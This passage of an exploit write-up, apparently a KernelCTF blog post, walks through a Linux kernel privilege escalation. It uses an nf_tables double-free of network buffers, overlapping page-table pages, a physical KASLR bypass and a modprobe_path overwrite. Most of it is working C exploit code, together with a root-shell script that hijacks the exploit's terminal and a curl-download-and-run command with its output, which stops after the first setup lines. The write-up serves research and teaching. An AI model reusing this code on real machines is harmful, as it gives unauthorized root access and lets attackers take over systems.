	// needs to be minimal since VMA registration costs memory
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
	{
		void *retv = mmap((void*)PTI_TO_VIRT(2, 0, i, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);

		if (retv == MAP_FAILED)
		{
			perror("mmap");
			exit(EXIT_FAILURE);
		}
	}

	// pre-allocate PMDs for sprayed PTEs
	// PTE_SPRAY_AMOUNT / 512 = PMD_SPRAY_AMOUNT: PMD contains 512 PTE children
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT / 512; i++)
		*(char*)PTI_TO_VIRT(2, i, 0, 0, 0) = 0x41;

	// these use different PTEs but the same PMD
	_pmd_area = mmap((void*)PTI_TO_VIRT(1, 1, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	pmd_kernel_area = _pmd_area;
	pmd_data_area = _pmd_area + 0x200000;

	PRINTF_VERBOSE("[*] allocated VMAs for process:\n  - pte_area: ?\n  - _pmd_area: %p\n  - modprobe_path: '%s' @ %p\n", _pmd_area, modprobe_path, modprobe_path);

	populate_sockets();

	set_ipfrag_time(1);

	// cause socket/networking-related objects to be allocated
	df_ip_header.ip_id = 0x1336;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 8 + 4000;
	df_ip_header.ip_off = ntohs((8 >> 3) | 0x2000);
	alloc_intermed_buf_hdr(32768 + 8, &df_ip_header);

	set_ipfrag_time(9999);

	printf("[*] waiting for the calm before the storm...\n");
	sleep(CONFIG_SEC_BEFORE_STORM);

    // ... (rest of the exploit)
}

```

Codeblock 5.1.1.3.1: Partial code for the exploit written in C, which pre-allocates objects to reduce noise on the kernel page allocators.

#### 5.1.2. Performing double-free

Performing the double-free is the most tricky part of the exploit as we need to play with IPv4 networking code and the page allocators. In this section we will perform it so we can obtain arbitrary, unlimited r/w to any physical memory page with Dirty Pagedirectory in the next section, which is ironically enough a lot easier.

##### 5.1.2.1. Reserving clean skb's for masking

In order to allocate skb's before the double-free (which we free in between the double-free to avoid detection and for stability), the exploit sends UDP packets to its own UDP listener socket. Until the UDP listener recv()'s the packets, they will remain in memory as seperate skb's.

```
void send_ipv4_udp(const char* buf, size_t buflen)
{
    struct sockaddr_in dst_addr = {
		.sin_family = AF_INET,
        .sin_port = htons(45173),
		.sin_addr.s_addr = inet_addr("127.0.0.1")
	};

	sendto_noconn(&dst_addr, buf, buflen, sendto_ipv4_udp_client_sockfd);
}
```

Codeblock 5.1.2.1.1: The `send_ipv4_udp()` exploit function written in C, which abstracts away networking data.

```
static void alloc_ipv4_udp(size_t content_size)
{
	PRINTF_VERBOSE("[*] sending udp packet...\n");
	memset(intermed_buf, '\x00', content_size);
	send_ipv4_udp(intermed_buf, content_size);
}

static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ... (setup code)

    // pop N skbs from skb freelist
	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
	{
		PRINTF_VERBOSE("[*] reserving udp packets... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
		alloc_ipv4_udp(1);
	}

    // ... (rest of the exploit)
}
```

Codeblock 5.1.2.1.2: Partial code for the exploit written in C, which allocated UDP packets to spray sk\_buff objects, for free-usage later.

##### 5.1.2.2. Triggering double-free 1st free

In order to trigger the double-free I send an IP packet which triggers the nftables rule we set up earlier. It is an arbitrary protocol excluding TCP and UDP, because they would get passed on to the TCP/UDP handler code which would panic the kernel due to data corruption.

Note the usage of the `IP_MF` flag (`0x2000`) in the offset field of IP header, which we use to force the skb into an IP fragment queue, and free the skb at will later by sending the "completing" fragment. Also note that the size of this skb determines the double-free size. If we allocate a packet with 0 bytes content, the allocated skb head object will be in kmalloc-256 (because of metadata), but if we allocate an packet with 32768 bytes, it will be order 4 (16-page from the buddy-allocator).

```
static char intermed_buf[1 << 19]; // simply pre-allocate intermediate buffers

static int sendto_ipv4_ip_sockfd;

void send_ipv4_ip_hdr(const char* buf, size_t buflen, struct ip *ip_header)
{
	size_t ip_buflen = sizeof(struct ip) + buflen;
    struct sockaddr_in dst_addr = {
		.sin_family = AF_INET,
		.sin_addr.s_addr =  inet_addr("127.0.0.2")  // 127.0.0.1 will not be ipfrag_time'd. this can't be set to 1.1.1.1 since C runtime will prob catch it
	};

    memcpy(intermed_buf, ip_header, sizeof(*ip_header));
	memcpy(&intermed_buf[sizeof(*ip_header)], buf, buflen);

	// checksum needds to be 0 before
	((struct ip*)intermed_buf)->ip_sum = 0;
	((struct ip*)intermed_buf)->ip_sum = ip_finish_sum(ip_checksum(intermed_buf, ip_buflen, 0));

	PRINTF_VERBOSE("[*] sending IP packet (%ld bytes)...\n", ip_buflen);

	sendto_noconn(&dst_addr, intermed_buf, ip_buflen, sendto_ipv4_ip_sockfd);
}
```

Codeblock 5.1.2.2.1: The `send_ipv4_ip_hdr()` exploit function written in C, which abstracts away checksumming and socket code, when trying to send a raw IP packet.

```
static char intermed_buf[1 << 19];

static void send_ipv4_ip_hdr_chr(size_t dfsize, struct ip *ip_header, char chr)
{
	memset(intermed_buf, chr, dfsize);
	send_ipv4_ip_hdr(intermed_buf, dfsize, ip_header);
}

static void trigger_double_free_hdr(size_t dfsize, struct ip *ip_header)
{
	printf("[*] sending double free buffer packet...\n");
	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x41');
}

static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ... (skb spray)

    // allocate and free 1 skb from freelist
	df_ip_header.ip_id = 0x1337;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
	df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);  // wait for other fragments. 8 >> 3 to make it wait or so?
	trigger_double_free_hdr(32768 + 8, &df_ip_header);

    // ... (rest of the exploit)
}
```

Codeblock 5.1.2.2.2: Partial code for the exploit written in C, which sends the raw IP packet and triggers the nf\_tables rule we set up earlier.

##### 5.1.2.3. Masking the double-free with skb's

In order to prevent detection of the double-free and to improve stability of the exploit, we spray-free the UDP packets we allocated earlier.

```
static char intermed_buf[1 << 19]; // simply pre-allocate intermediate buffers

static int sendto_ipv4_udp_server_sockfd;

void recv_ipv4_udp(int content_len)
{
    PRINTF_VERBOSE("[*] doing udp recv...\n");
    recv(sendto_ipv4_udp_server_sockfd, intermed_buf, content_len, 0);

	PRINTF_VERBOSE("[*] udp packet preview: %02hhx\n", intermed_buf[0]);
}
```

Codeblock 5.1.2.3.1: The `recv_ipv4_udp()` exploit function written in C, which abstracts away socket code when receiving an UDP packet.

```
static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ... (trigger doublefree)

	// push N skbs to skb freelist
	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
	{
		PRINTF_VERBOSE("[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
		recv_ipv4_udp(1);
	}

    // ... (rest of the exploit)
}
```

Codeblock 5.1.2.3.2: Partial code for the exploit written in C, which frees the previously allocated sk\_buff objects.

##### 5.1.2.4. Spraying PTEs

In order to spray PTEs we simply access the virtual memory pages in the VMA we registered earlier. Note that a PTE contains 512 pages, and therefore `0x20'0000` bytes. Hence, we access once every `0x20'0000` bytes a total of `CONFIG_PTE_SPRAY_AMOUNT` times.

In order to simplify this process, I wrote a macro which converts pagetable indices to virtual memory addresses. I.e. `mm->pgd[pud_nr][pmd_nr][pte_nr][page_nr]` is responsible for virtual memory page `PTI_TO_VIRT(pud_nr, pmd_nr, pte_nr, page_nr, 0)`. For example, `mm->pgd[1][0][0][0]` refers to the virtual memory page at `0x80'0000'0000`.

```
#define _pte_index_to_virt(i) (i << 12)
#define _pmd_index_to_virt(i) (i << 21)
#define _pud_index_to_virt(i) (i << 30)
#define _pgd_index_to_virt(i) (i << 39)
#define PTI_TO_VIRT(pud_index, pmd_index, pte_index, page_index, byte_index) \
	((void*)(_pgd_index_to_virt((unsigned long long)(pud_index)) + _pud_index_to_virt((unsigned long long)(pmd_index)) + \
	_pmd_index_to_virt((unsigned long long)(pte_index)) + _pte_index_to_virt((unsigned long long)(page_index)) + (unsigned long long)(byte_index)))

static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ... (spray-free skb's)

	// spray-allocate the PTEs from PCP allocator order-0 list
	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
		*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;

    // ... (rest of the exploit)
}
```

Codeblock 5.1.2.4.1: Partial code for the exploit written in C, which sprays PTE pages and defines a macro to convert pagetable indices to virtual addresses.

##### 5.1.2.5. Triggering double-free free 2

We previously drained the PCP list and allocated a bunch of PTEs on the page entry we freed with free 1. Now, we will do free 2 to use its page freelist entry to allocate an overlapping PMD.

We need to use a very specific combination of IP header options to circumvent certain checks in the IPv4 fragment queue code. For specific details, check the relevant background info and/or technique sections.

```
static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ... (spray-alloc PTEs)

	PRINTF_VERBOSE("[*] double-freeing skb...\n");

	// cause double-free on skb from earlier
	df_ip_header.ip_id = 0x1337;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
	df_ip_header.ip_off = ntohs(((32768 + 8) >> 3) | 0x2000);

	// skb1->len gets overwritten by s->random() in set_freepointer(). need to discard queue with tricks circumventing skb1->len
	// causes end == offset in ip_frag_queue(). packet will be empty
	// remains running until after both frees, a.k.a. does not require sleep
	alloc_intermed_buf_hdr(0, &df_ip_header);

    // ... (rest of the exploit)
}
```

Codeblock 5.1.2.5.1: Partial code for the exploit written in C, which triggers the 2nd free of the double-free and navigates a specific IP fragment queue.

##### 5.1.2.6. Allocating the PMD

Now we have the 2nd freelist entry to the double-freed page (note that it has already been allocated by the PTE, so there are not 2 freelist entries at the same time), we can allocate the overlapping PMD to this page. This is incredibly complicated.

```
static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ... (free 2 of skb)

	// allocate overlapping PMD page (overlaps with PTE)
	*(unsigned long long*)_pmd_area = 0xCAFEBABE;

    // ... (rest of the exploit)
}
```

Codeblock 5.1.2.6.1: Partial code for the exploit written in C, which allocates the overlapping PMD page by writing to a userland page.

##### 5.1.2.7. Finding the overlapping PTE

Now we have an overlapping PMD and PTE somewhere, we need to find out which of the sprayed PTEs is the overlapping one. This is a very easy procedure as well, as it involves checking which of the PTE areas has an PTE entry belonging to the PMD area. This is essentially equal to checking if the value is not the original value, indicating the page was overwritten.

In case we want to perform a manual sanity check, we also print physical address 0x0 to the user. This usually belongs to MMIO devices, but will usually look the same.

```
static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ... (allocate the overlapping PMD page)

	printf("[*] checking %d sprayed pte's for overlap...\n", CONFIG_PTE_SPRAY_AMOUNT);

	// find overlapped PTE area
	pte_area = NULL;
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
	{
		unsigned long long *test_target_addr = PTI_TO_VIRT(2, 0, i, 0, 0);

		// pte entry pte[0] should be the PFN+flags for &_pmd_area
		// if this is the double allocated PTE, the value is PFN+flags, not 0x41
		if (*test_target_addr != 0x41)
		{
			printf("[+] confirmed double alloc PMD/PTE\n");
			PRINTF_VERBOSE("    - PTE area index: %lld\n", i);
			PRINTF_VERBOSE("    - PTE area (write target address/page): %016llx (new)\n", *test_target_addr);
			pte_area = test_target_addr;
		}
	}

	if (pte_area == NULL)
	{
		printf("[-] failed to detect overwritten pte: is more PTE spray needed? pmd: %016llx\n", *(unsigned long long*)_pmd_area);

		return;
	}

    // set new pte value for sanity check
	*pte_area = 0x0 | 0x8000000000000867;

	flush_tlb(_pmd_area, 0x400000);
	PRINTF_VERBOSE("    - PMD area (read target value/page): %016llx (new)\n", *(unsigned long long*)_pmd_area);

    // (rest of the exploit)
}
```

Codeblock 5.1.2.7.1: Partial code for the exploit written in C, which allocates the overlapping PMD page by writing to a userland page.

#### 5.1.3. Scanning physical memory

After we have set up the PUD+PMD double alloc, we can leverage the true potential of Dirty Pagedirectory: an kernel-space mirroring attack (KSMA) entirely from userland. We can now write physical addresses as PTE entries to a certain address within the PTE area, and then "dereference" it as a normal page of memory in the PMD area.

In this section, we will acquire the physical kernel base address and then use that to access the modprobe\_path kernel variable with read/write privileges.

##### 5.1.3.1 Finding kernel base address

Here, we apply the mentioned physical KASLR bypass to find the physical kernel base. Assuming a device with 8GiB physical memory, that reduces the memory that needs to be scanned from 8GiB to 2MiB worth of pages. Thankfully, we only need around ~40 bytes per page to decide if it is the kernel base, which means we need to read 512 \* 40 = 20.480 bytes in the worst case to find the kernel base.

In order to determine if the page is the kernel base, I wrote the [`get-sig`](https://github.com/Notselwyn/get-sig) Python scripts, which finds common bytes at the same addresses (signatures), filters out the signatures which are common in physical memory, and converts them into a memcmp statement. By increasing the amount of kernel samples, we can extend the support for other kernels (i.e. other compilers and old versions). The output looks something like the codeblock below.

```
static int is_kernel_base(unsigned char *addr)
{
	// thanks python

	// get-sig kernel_runtime_1
	if (memcmp(addr + 0x0, "\x48\x8d\x25\x51\x3f", 5) == 0 &&
			memcmp(addr + 0x7, "\x48\x8d\x3d\xf2\xff\xff\xff", 7) == 0)
		return 1;

	// get-sig kernel_runtime_2
	if (memcmp(addr + 0x0, "\xfc\x0f\x01\x15", 4) == 0 &&
			memcmp(addr + 0x8, "\xb8\x10\x00\x00\x00\x8e\xd8\x8e\xc0\x8e\xd0\xbf", 12) == 0 &&
			memcmp(addr + 0x18, "\x89\xde\x8b\x0d", 4) == 0 &&
			memcmp(addr + 0x20, "\xc1\xe9\x02\xf3\xa5\xbc", 6) == 0 &&
			memcmp(addr + 0x2a, "\x0f\x20\xe0\x83\xc8\x20\x0f\x22\xe0\xb9\x80\x00\x00\xc0\x0f\x32\x0f\xba\xe8\x08\x0f\x30\xb8\x00", 24) == 0 &&
			memcmp(addr + 0x45, "\x0f\x22\xd8\xb8\x01\x00\x00\x80\x0f\x22\xc0\xea\x57\x00\x00", 15) == 0 &&
			memcmp(addr + 0x55, "\x08\x00\xb9\x01\x01\x00\xc0\xb8", 8) == 0 &&
			memcmp(addr + 0x61, "\x31\xd2\x0f\x30\xe8", 5) == 0 &&
			memcmp(addr + 0x6a, "\x48\xc7\xc6", 3) == 0 &&
			memcmp(addr + 0x71, "\x48\xc7\xc0\x80\x00\x00", 6) == 0 &&
			memcmp(addr + 0x78, "\xff\xe0", 2) == 0)
		return 1;

	return 0;
}

```

Codeblock 5.1.3.1.1: The `is_kernel_base()` exploit function written in C, compares memory to signatures of the kernel base.

Now, it is time to scan. We fill the PTE page (which overlaps with the PMD page responsible for `pmd_kernel_area`) with all 512 pages which could be the kernel base page. If we had to scan more than 512 pages, we simply put the code in a loop with an incrementing PFN (physical address).

> To reiterate: it is 512 pages because we are dealing with 8GiB physical memory. If it were 4GiB, it would be 256 pages, since `4GiB / CONFIG_PHYSICAL_START = 256`.

When we are setting the PTE entry in the PTE page (`pte_area[j] = (CONFIG_PHYSICAL_START * j) | 0x8000000000000867;`), we are setting both the PFN (`CONFIG_PHYSICAL_START * j`) which can be considered the physical address, and the coresponding flags (`0x8000000000000867`) like the permissions of said page (i.e. read/write).

Remember from the Dirty Pagedirectory section that because of the double-free: `mm->pgd[0][1]` (PMD) == `mm->pgd[0][2][0]` (PTE), and therefore `mm->pgd[0][1][x]` (PTE) == `mm->pgd[0][2][0][x]` (userland page) with x = 0->511. This means that we can overwrite 512 PTEs in the overlapping PMD with the 512 userland pages. These 512 PTEs are responsible for another 512 userland pages, which means we can set `512 * 512 * 0x1000 = 0x4000'0000` (1GiB) of memory at a time.

For readability I use utilize only 2 PTEs from these 512 PTEs, and respectively use them as `pmd_kernel_area` (for scanning kernel bases) and `pmd_data_area` (for scanning kernel memory content).

```
static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ... (setup dirty pagedirectory)

	// range = (k * j) * CONFIG_PHYSICAL_ALIGN
	// scan 512 pages (1 PTE worth) for kernel base each iteration
	for (int k=0; k < (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * 512)); k++)
	{
		unsigned long long kernel_iteration_base;

		kernel_iteration_base = k * (CONFIG_PHYSICAL_ALIGN * 512);

		PRINTF_VERBOSE("[*] setting kernel physical address range to 0x%016llx - 0x%016llx\n", kernel_iteration_base, kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * 512);
		for (unsigned short j=0; j < 512; j++)
			pte_area[j] = (kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j) | 0x8000000000000867;

		flush_tlb(_pmd_area, 0x400000);

		// scan 1 page (instead of CONFIG_PHYSICAL_ALIGN) for kernel base each iteration
		for (unsigned long long j=0; j < 512; j++)
		{
			unsigned long long phys_kernel_base;

			// check for x64-gcc/clang signatures of kernel code segment at rest and at runtime
			// - this "kernel base" is actually the assembly bytecode of start_64() and variants
			// - it's different per architecture and per compiler (clang produces different signature than gcc)
			// - this can be derived from the vmlinux file by checking the second segment, which starts likely at binary offset 0x200000
			//   - i.e: xxd ./vmlinux | grep '00200000:'

			phys_kernel_base = kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j;

			PRINTF_VERBOSE("[*] phys kernel addr: %016llx, val: %016llx\n", phys_kernel_base, *(unsigned long long*)(pmd_kernel_area + j * 0x1000));

			if (is_kernel_base(pmd_kernel_area + j * 0x1000) == 0)
				continue;

            // ... (rest of the exploit)
		}
	}

	printf("[!] failed to find kernel code segment... TLB flush fail?\n");
	return;
}

```

Codeblock 5.1.3.1.2: A part of the `privesc_flh_bypass_no_time()` exploit function written in C, where it searches for the physical kernel base address.

##### 5.1.3.2. Finding modprobe\_path

Now we found the physical kernel base address, we will scan the memory beyond it. In order to identify modprobe\_path, we scan for `CONFIG_MODPROBE_PATH` (`"/sbin/modprobe"`) with a `'\x00'` padding up to `KMOD_PATH_LEN` (256) bytes. We can verify if this address is correct by overwriting it and checking if `/proc/sys/kernel/modprobe` reflects this change, as this is a direct reference to `modprobe_path`.

Alternatively, the static usermode helper mitigation may be enabled. Fortunately for us this can be bypassed as well. Instead of searching for `"/sbin/modprobe"` we will simply search for `CONFIG_STATIC_USERMODEHELPER_PATH` (`"/sbin/usermode-helper"`) etc. Unfortunately there is no method to verify if this is the correct instance, but there should only be one match.

Then, when the target is found, we will try to overwrite it. If it fails, we will simply continue scanning for another target match.

```
static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ...

	// range = (k * j) * CONFIG_PHYSICAL_ALIGN
	// scan 512 pages (1 PTE worth) for kernel base each iteration
	for (int k=0; k < (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * 512)); k++)
	{
		unsigned long long kernel_iteration_base;

        // ... (set 512 PTE entries in 1 PTE page)

		// scan 1 page (instead of CONFIG_PHYSICAL_ALIGN) for kernel base each iteration
		for (unsigned long long j=0; j < 512; j++)
		{
			unsigned long long phys_kernel_base;

            // ... (find physical kernel base address)

			// scan 40 * 0x200000 (2MiB) = 0x5000000 (80MiB) bytes from kernel base for modprobe path. if not found, just search for another kernel base
			for (int i=0; i < 40; i++)
			{
				void *pmd_modprobe_addr;
				unsigned long long phys_modprobe_addr;
				unsigned long long modprobe_iteration_base;

				modprobe_iteration_base = phys_kernel_base + i * 0x200000;

				PRINTF_VERBOSE("[*] setting physical address range to 0x%016llx - 0x%016llx\n", modprobe_iteration_base, modprobe_iteration_base + 0x200000);

				// set the pages for the other threads PUD data range to kernel memory
				for (unsigned short j=0; j < 512; j++)
					pte_area[512 + j] = (modprobe_iteration_base + 0x1000 * j) | 0x8000000000000867;

				flush_tlb(_pmd_area, 0x400000);

#if CONFIG_STATIC_USERMODEHELPER
				pmd_modprobe_addr = memmem(pmd_data_area, 0x200000, CONFIG_STATIC_USERMODEHELPER_PATH, strlen(CONFIG_STATIC_USERMODEHELPER_PATH));
#else
				pmd_modprobe_addr = memmem_modprobe_path(pmd_data_area, 0x200000, modprobe_path, KMOD_PATH_LEN);
#endif
				if (pmd_modprobe_addr == NULL)
					continue;

#if CONFIG_LEET
				breached_the_mainframe();
#endif

				phys_modprobe_addr = modprobe_iteration_base + (pmd_modprobe_addr - pmd_data_area);
				printf("[+] verified modprobe_path/usermodehelper_path: %016llx ('%s')...\n", phys_modprobe_addr, (char*)pmd_modprobe_addr);

                // ... (rest of the exploit)
			}

			printf("[-] failed to find correct modprobe_path: trying to find new kernel base...\n");
		}
	}

	printf("[!] failed to find kernel code segment... TLB flush fail?\n");
	return;
}

```

Codeblock 5.1.3.2.1: A part of the `privesc_flh_bypass_no_time()` exploit function written in C, where it searches for the physical modprobe\_path address.

#### 5.1.4. Overwriting modprobe\_path

Finally: we have read/write access to modprobe\_path. Sadly, there's one final challenge left: getting the "real" PID of the exploit so we can execute `/proc/<pid>/fd` (the file descriptor containing the privesc script). Checking wether or not it succeeded is done in the next section.

> Even if we were using on-disk files, the exploit would need to know the PID, since we would need to use `/proc/<pid>/cwd` if we were in a mnt namespace. Of course in practice there are ways to circumvent this - such as using the PID shown in the kernel warning message - but I wanted to make this exploit as universal as possible.

As you can see in the codeblock below, we overwrite modprobe\_path or the static usermode helper string with `"/proc/<pid>/fd/<script_fd>"`, which refers to the privilege escalation script, mentioned in the next sections.

Note that the privilege escalation script (included in this codeblock) uses the PID of the current PID guess for shell purposes and for checking if the guess was correct.

```
#define MEMCPY_HOST_FD_PATH(buf, pid, fd) sprintf((buf), "/proc/%u/fd/%u", (pid), (fd));

static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ...

	// run this script instead of /sbin/modprobe
	int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
	int status_fd = memfd_create("", 0);

	// range = (k * j) * CONFIG_PHYSICAL_ALIGN
	// scan 512 pages (1 PTE worth) for kernel base each iteration
	for (int k=0; k < (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * 512)); k++)
	{
		// scan 1 page (instead of CONFIG_PHYSICAL_ALIGN) for kernel base each iteration
		for (unsigned long long j=0; j < 512; j++)
		{
			// scan 40 * 0x200000 (2MiB) = 0x5000000 (80MiB) bytes from kernel base for modprobe path. if not found, just search for another kernel base
			for (int i=0; i < 40; i++)
			{
				void *pmd_modprobe_addr;
				unsigned long long phys_modprobe_addr;
				unsigned long long modprobe_iteration_base;

                // ... (find modprobe_path)

				PRINTF_VERBOSE("[*] modprobe_script_fd: %d, status_fd: %d\n", modprobe_script_fd, status_fd);

				printf("[*] overwriting path with PIDs in range 0->4194304...\n");
				for (pid_t pid_guess=0; pid_guess < 4194304; pid_guess++)
				{
					int status_cnt;
					char buf;

					// overwrite the `modprobe_path` kernel variable to "/proc/<pid>/fd/<script_fd>"
					// - use /proc/<pid>/* since container path may differ, may not be accessible, et cetera
					// - it must be root namespace PIDs, and can't get the root ns pid from within other namespace
					MEMCPY_HOST_FD_PATH(pmd_modprobe_addr, pid_guess, modprobe_script_fd);

					if (pid_guess % 50 == 0)
					{
						PRINTF_VERBOSE("[+] overwriting modprobe_path with different PIDs (%u-%u)...\n", pid_guess, pid_guess + 50);
						PRINTF_VERBOSE("    - i.e. '%s' @ %p...\n", (char*)pmd_modprobe_addr, pmd_modprobe_addr);
						PRINTF_VERBOSE("    - matching modprobe_path scan var: '%s' @ %p)...\n", modprobe_path, modprobe_path);
					}

					lseek(modprobe_script_fd, 0, SEEK_SET); // overwrite previous entry
					dprintf(modprobe_script_fd, "#!/bin/sh\necho -n 1 1>/proc/%u/fd/%u\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n", pid_guess, status_fd, pid_guess, shell_stdin_fd, pid_guess, shell_stdout_fd);

					// ... (rest of the exploit)
				}

				printf("[!] verified modprobe_path address does not work... CONFIG_STATIC_USERMODEHELPER enabled?\n");

				return;
			}

			printf("[-] failed to find correct modprobe_path: trying to find new kernel base...\n");
		}
	}

	printf("[!] failed to find kernel code segment... TLB flush fail?\n");
	return;
}

```

Codeblock 5.1.4.1: A part of the `privesc_flh_bypass_no_time()` exploit function written in C, where it overwrites the `modprobe_path` kernel variable.

#### 5.1.5. Dropping root shell

In order to drop a rootshell, we execute run the invalid file using `modprobe_trigger_memfd()`, which takes advantage of the overwritten modprobe\_path. The new modprobe\_path points to the script (`/proc/<pid>/fd/<fd>`) below. It writes `1` to the newly allocated status file descriptor, which makes the exploit detect a successfull root shell and stop the execution. Then, it gives a shell to the console.

In order to universally drop a root shell - without making assumptions about namespaces, and keeping it fileless - I "hijack" the stdin and stdout file descriptors from the exploit and forward them to the root shell. This works on local machines, as well as reverse shells. Essentially - without file redirection functionality - the script runs:

```
#!/bin/sh
echo -n 1 > /proc/<exploit_pid>/fd/<status_fd>
/bin/sh 0</proc/<exploit_pid>/fd/0 1>/proc/<exploit_pid>/fd/1 2>&
```

Codeblock 5.1.5.1: A BASH script executed as root, to pass the success rate and give the user a shell.

```
static void modprobe_trigger_memfd()
{
	int fd;
	char *argv_envp = NULL;

	fd = memfd_create("", MFD_CLOEXEC);
	write(fd, "\xff\xff\xff\xff", 4);

	fexecve(fd, &argv_envp, &argv_envp);

	close(fd);
}

static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ...

	// run this script instead of /sbin/modprobe
	int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
	int status_fd = memfd_create("", 0);

	// range = (k * j) * CONFIG_PHYSICAL_ALIGN
	// scan 512 pages (1 PTE worth) for kernel base each iteration
	for (int k=0; k < (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * 512)); k++)
	{
		// scan 1 page (instead of CONFIG_PHYSICAL_ALIGN) for kernel base each iteration
		for (unsigned long long j=0; j < 512; j++)
		{
			// scan 40 * 0x200000 (2MiB) = 0x5000000 (80MiB) bytes from kernel base for modprobe path. if not found, just search for another kernel base
			for (int i=0; i < 40; i++)
			{
				for (pid_t pid_guess=0; pid_guess < 65536; pid_guess++)
				{
					int status_cnt;
					char buf;

                    // ... (overwrite modprobe_path)

					// run custom modprobe file as root, by triggering it by executing file with unknown binfmt
					// if the PID is incorrect, nothing will happen
					modprobe_trigger_memfd();

					// indicates correct PID (and root shell). stops further bruteforcing
					status_cnt = read(status_fd, &buf, 1);
					if (status_cnt == 0)
						continue;

					printf("[+] successfully breached the mainframe as real-PID %u\n", pid_guess);

					return;
				}

				printf("[!] verified modprobe_path address does not work... CONFIG_STATIC_USERMODEHELPER enabled?\n");

				return;
			}

			printf("[-] failed to find correct modprobe_path: trying to find new kernel base...\n");
		}
	}

	printf("[!] failed to find kernel code segment... TLB flush fail?\n");
	return;
}

```

Codeblock 5.1.5.2: A part of the `privesc_flh_bypass_no_time()` exploit function written in C, where it triggers the modprobe\_path mechanism.

#### 5.1.6. Post-exploit stability

As a byproduct of our memory shenanigans, the pagetable pages for the exploit process are a tad unstable. Fortunately, this only becomes a problem when the process stops, so we can solve it by not making it stop. :^)

We do this using a simple sleep() call, which unfortunately makes the TTY of the user sleep as well, since the process is sleeping in the foreground. To circumvent this, we make the exploit spawn a child process which performs the actual exploit, and make the parent exit when it is sementically supposed to.

Additionally, we register a signal handler for the children for `SIGINT` which will handle (among others) keyboard interrupts. This causes our child process to sleep in the background. The parent is not affected, as the handler is set in the child process.

> Notice that we cannot use wait() as the child processes will remain running in the background.

```
int main()
{
	int *exploit_status;

	exploit_status = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*exploit_status = EXPLOIT_STAT_RUNNING;

	// detaches program and makes it sleep in background when succeeding or failing
	// - prevents kernel system instability when trying to free resources
	if (fork() == 0)
	{
		int shell_stdin_fd;
		int shell_stdout_fd;

		signal(SIGINT, signal_handler_sleep);

		// open copies of stdout etc which will not be redirected when stdout is redirected, but will be printed to user
		shell_stdin_fd = dup(STDIN_FILENO);
		shell_stdout_fd = dup(STDOUT_FILENO);

#if CONFIG_REDIRECT_LOG
		setup_log("exp.log");
#endif

		setup_env();

		privesc_flh_bypass_no_time(shell_stdin_fd, shell_stdout_fd);

		*exploit_status = EXPLOIT_STAT_FINISHED;

		// prevent crashes due to invalid pagetables
		sleep(9999);
	}

	// prevent premature exits
	SPINLOCK(*exploit_status == EXPLOIT_STAT_RUNNING);

	return 0;
}
```

Codeblock 5.1.6.1: A part of the `main()` exploit function written in C, which sets up the child processes and waits until the exploit is done.

#### 5.1.7. Running it

For KernelCTF, I ran the exploit using `cd /tmp && curl https://secret.pwning.tech/<gid> -o ./exploit && chmod +x ./exploit && ./exploit`. This takes advantage of the writable `/tmp` directory on the target machine. This was before I realized I could presumably execute the exploit filelessly with Perl. Finally, after months of work, we are rewarded with:

```
user@lts-6:/$ id
uid=1000(user) gid=1000(user) groups=1000(user)

user@lts-6:/$ curl https://cno.pwning.tech/aaaabbbb-cccc-dddd-eeee-ffffgggghhhh -o /tmp/exploit && cd /tmp && chmod +x exploit && ./exploit
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  161k  100  161k    0     0   823k      0 --:--:-- --:--:-- --:--:--  823k

[*] creating user namespace (CLONE_NEWUSER)...
[*] creating network namespace (CLONE_NEWNET)...
[*] setting up UID namespace...
